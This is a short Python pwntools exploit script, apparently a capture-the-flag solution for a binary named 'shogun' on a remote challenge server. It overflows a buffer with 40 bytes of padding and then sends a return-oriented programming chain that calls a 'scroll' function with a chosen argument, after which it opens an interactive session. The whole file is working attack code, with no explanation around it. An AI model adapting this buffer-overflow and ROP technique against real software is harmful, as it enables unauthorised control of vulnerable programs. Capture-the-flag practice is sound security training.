#!/usr/bin/env python3

from pwn import *

exe = ELF("./shogun")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, '''
                b *encounter+53
                set {int}'usleep@plt'=0xc3
                c
            ''')
    else:
        r = remote("pwn.chall.pwnoh.io", 13373)

    return r


def main():
    r = conn()

    pop_rdi = 0x0000000000401383
    pop_rsi_pop_r15 = 0x0000000000401381
    pop_r12_r13_r14_r15 = 0x000000000040137c
    scroll = 0x00000000004011d6
    ret = 0x000000000040101a

    payload = b''.join([
        p64(ret),
        p64(pop_rdi),
        p64(exe.symbols["txt"]),
        p64(scroll),
    ])

    r.sendline(b'Look around.')
    r.sendline(b'A'*40 + payload)
    # r.sendline(b'A'*39 + b'B'*8)

    r.interactive()


if __name__ == "__main__":
    main()
